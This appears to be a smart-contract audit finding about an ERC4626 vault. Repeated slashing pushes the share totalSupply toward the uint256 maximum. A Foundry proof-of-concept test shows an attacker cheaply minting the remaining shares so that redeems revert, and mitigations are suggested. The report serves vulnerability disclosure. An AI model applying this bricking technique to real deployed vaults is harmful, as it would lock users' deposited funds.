# Vulnerability details

## Impact
If vault will slash users too much times, deposits will slowly stop working. In this state, there exists possibility for malicious actor to brick the vault entirely.

## Problem
Each slashing is removing assets from ERC4626 vault, making each asset convert to more shares. If at the start 1 asset = 1 share, after 50% slashing 1 asset would be equal to 2 shares.
Since slashing amounts are usually represented as % of the assets, this ratio is growing exponentially.
And, since vaults are not used to distribute rewards, there is only one way in which this ratio can change.

As a result, shares `totalSupply` can grow very close to the maximum value of uint256

For example, it would take around 50 90% slashes or 180 50% slashes to bring the vault into this dangerous state, where some deposits would stop working.

## Probability
I don't think that this problem will affect most of the pools in a reasonable amount of time. However, since the protocol is very general and does not assume what kind of vaults will be created on top of it, some vault types can still be exposed to this problem.

## Bricking

When shares `totalSupply` is below uint256 maximum value, users can still redeem. But the vault will stop working entirely if shares `totalSupply` will be exactly equal to the uint256 max value. It's very improbable that users will mint exactly that amount by chance, but there is a possibility to mint it with malicious intent (with very little price), like showed in PoC.

Since solady's ERC4626 using `totalSupply + 1` in its calculations when converting assets to shares and back (example: https://github.com/Vectorized/solady/blob/753c57bad8912defb609fec6d2342f8396e6a5ac/src/tokens/ERC4626.sol#L176 ), vault logic will be completely bricked.

## Proof of Concept
Place this test inside `vault.t.sol` to run it:

    function test_slashing_degradation() public {
        //initial mint
        mintAndDeposit(1000e18);

        //we simulate 56 rounds of 90% slashing
        for(uint i = 0; i < 56; i++){
            uint currentAssets = depositToken.balanceOf(address(vault));
            uint burnAmount = currentAssets - currentAssets / 10;
            depositToken.burn(address(vault), burnAmount);

            mintAndDeposit(1000e18);
        }

        //After this, large deposits will gradually stop working, but users will still be able to redeem
        //Now, we will mint exact amount of shares to reach max uint256

        //calculating how much shares tokens needed to reach max uint256
        uint leftTillMaxValue = type(uint256).max - vault.totalSupply();

        //asserting that asset amount needed to be deposited is reasonable number so the test is valid
        uint assetAmount = vault.previewMint(leftTillMaxValue);
        assertTrue(assetAmount < 1000e18);

        //minting shares to reach max uint256
        depositToken.mint(address(this), leftTillMaxValue);
        depositToken.approve(address(vault), leftTillMaxValue);
        vault.mint(leftTillMaxValue, address(this));

        //now, vault is fully bricked, and redeems will not work

        uint256 withdrawalNonce = vault.getNextWithdrawNonce(address(this));
        uint sharesAmount = vault.balanceOf(address(this));
        vault.approve(address(vault), sharesAmount);

        //will revert with FullMulDivFailed() error
        vm.expectRevert(0xae47f702);
        bytes32 withdrawalKey = vault.startRedeem(sharesAmount, address(this));
    }

## Recommended Mitigation Steps
Obvious one is adding some kind of wrapping for vault totalSupply.
But since this will not be very common problem, and adding wrapping logic can be very bug prone, I think the best mitigation would be putting vault into redeem-only mode after conditions will become dangerous
